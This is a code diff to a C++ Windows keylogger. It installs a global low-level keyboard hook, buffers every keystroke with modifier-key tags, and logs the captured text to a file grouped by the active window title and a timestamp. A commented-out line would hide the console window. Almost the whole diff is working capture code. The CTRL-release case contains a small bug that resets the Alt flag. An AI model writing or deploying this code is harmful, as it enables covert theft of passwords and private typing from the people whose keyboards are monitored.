@@ -4,30 +4,17 @@ using namespace std;
 
 KeyLogger* KeyLogger::instance = NULL;
 
-KeyLogger::KeyLogger(std::string logFilePath) {
+KeyLogger::KeyLogger(std::string _logFilePath) {
 
     //ShowWindow(GetConsoleWindow(), SW_HIDE);
-
-    HINSTANCE instance = GetModuleHandle(NULL);
-    if(!instance) {
-        exit(1);
-    }
-
-    hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hookFunction, instance, 0);
 
     lshiftDown = false;
     rshiftDown = false;
     altDown = false;
     ctrlDown = false;
 
-    ifstream logCheck(logFilePath.c_str(), ios::in);
-    logFile.open(logFilePath.c_str(), ios::app);
-
-    if(!logCheck.good()) {
-        logFile << "Time, Key, LShift, RShift, Alt, Ctrl, Window" << endl;
-    }
-
-    logCheck.close();
+	logFilePath = _logFilePath;
+	activeWindowTitle = getActiveWindowTitle();
 }
 
 KeyLogger::~KeyLogger() {
@@ -54,6 +41,8 @@ void KeyLogger::releaseInstance() {
 
 LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {
 
+	KeyLogger* keylogger = getInstance();
+
     if (nCode >= 0) {
 
         if(wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
@@ -63,22 +52,42 @@ LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {
             switch(hooked.scanCode) {
 
                 case SC_LSHIFT:
-                    KeyLogger::getInstance()->setLShiftDown(true);
+					if (!keylogger->lshiftDown) {
+						keylogger->lshiftDown = true;
+						keylogger->keyboardBuffer += "<LSHIFT>";
+					}
                     break;
                 case SC_RSHIFT:
-                    KeyLogger::getInstance()->setRShiftDown(true);
+					if (!keylogger->rshiftDown) {
+						keylogger->rshiftDown = true;
+						keylogger->keyboardBuffer += "<RSHIFT>";
+					}
                     break;
                 case SC_ALT:
-                    KeyLogger::getInstance()->setAltDown(true);
+					if (!keylogger->altDown) {
+						keylogger->altDown = true;
+						keylogger->keyboardBuffer += "<ALT>";
+					}
                     break;
                 case SC_CTRL:
-                    KeyLogger::getInstance()->setCtrlDown(true);
+					if (!keylogger->ctrlDown) {
+						keylogger->ctrlDown = true;
+						keylogger->keyboardBuffer += "<CTRL>";
+					}
                     break;
+				case SC_SPACE:
+					keylogger->keyboardBuffer += " ";
+					break;
+				case SC_ENTER:
+					keylogger->keyboardBuffer += "[ENTER]\n";
+					break;
                 default:
                     DWORD key = 1;
                     key += hooked.scanCode << 16;
                     key += hooked.flags << 24;
-                    KeyLogger::getInstance()->log(key);
+					char keyText[100];
+					GetKeyNameText(key, keyText, sizeof(keyText));
+					keylogger->log(keyText);
             }
         }
 
@@ -88,17 +97,21 @@ LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {
 
             switch(hooked.scanCode) {
 
-                case SC_LSHIFT:;
-                    KeyLogger::getInstance()->setLShiftDown(false);
+                case SC_LSHIFT:
+					keylogger->lshiftDown = false;
+					keylogger->keyboardBuffer += "</LSHIFT>";
                     break;
                 case SC_RSHIFT:
-                    KeyLogger::getInstance()->setRShiftDown(false);
+					keylogger->rshiftDown = false;
+					keylogger->keyboardBuffer += "</RSHIFT>";
                     break;
                 case SC_ALT:
-                    KeyLogger::getInstance()->setAltDown(false);
+					keylogger->altDown = false;
+					keylogger->keyboardBuffer += "</ALT>";
                     break;
                 case SC_CTRL:
-                    KeyLogger::getInstance()->setCtrlDown(false);
+					keylogger->altDown = false;
+					keylogger->keyboardBuffer += "</CTRL>";
                     break;
                 default:
                     break;
@@ -106,10 +119,19 @@ LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {
         }
     }
 
-    return CallNextHookEx(KeyLogger::getInstance()->getHook(), nCode, wParam, lParam);
+	return CallNextHookEx(keylogger->getHook(), nCode, wParam, lParam);
 }
 
 void KeyLogger::listen() {
+
+	HINSTANCE instance = GetModuleHandle(NULL);
+	if (!instance) {
+		exit(1);
+	}
+
+	hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hookFunction, instance, 0);
+
+	logFile.open(logFilePath.c_str(), ios::app);
 
     MSG message;
     while (GetMessage(&message, NULL, 0, 0)) {
@@ -118,11 +140,27 @@ void KeyLogger::listen() {
     }
 }
 
-void KeyLogger::log(DWORD key) {
+void KeyLogger::log(std::string text) {
+	
+	if (getActiveWindowTitle() != activeWindowTitle) {
+		logFile << getTimeString() << endl <<
+			activeWindowTitle << endl << "============================" << endl <<
+			keyboardBuffer << endl << "============================" << endl << endl;
+		activeWindowTitle = getActiveWindowTitle();
+		keyboardBuffer = "";
+	}
 
-    char message[100];
-    GetKeyNameText(key, message, 100);
-    logFile << time(NULL) << ", " << message << ", " << lshiftDown << ", " << rshiftDown << ", " << altDown << ", " << ctrlDown << ", " << getActiveWindowTitle() << endl;
+	keyboardBuffer += text;
+}
+
+std::string KeyLogger::getTimeString() {
+	
+	time_t currentTime = time(NULL);
+	char dateString[100];
+	ctime_s(dateString, sizeof(dateString), &currentTime);
+	dateString[strlen(dateString) - 1] = NULL;
+
+	return std::string(dateString);
 }
 
 std::string KeyLogger::getActiveWindowTitle() {
